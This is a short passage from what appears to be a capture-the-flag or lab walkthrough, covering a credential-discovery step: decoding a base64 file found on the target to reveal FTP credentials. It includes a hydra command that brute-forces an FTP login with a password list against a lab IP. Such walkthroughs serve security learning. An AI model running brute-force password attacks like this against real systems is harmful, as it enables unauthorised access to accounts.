6. Credential Discovery
Inside the directories we discover a text file containing encoded information.
The content appears encoded using base64.
Decode it:
echo "encoded_text_here" | base64 -d
This reveals credentials for a user.
Example:
username: ftpuser
password: ******
hydra -l ftpuser -P pass.txt 10.48.178.142 ftp                                                                                                                                                                                          
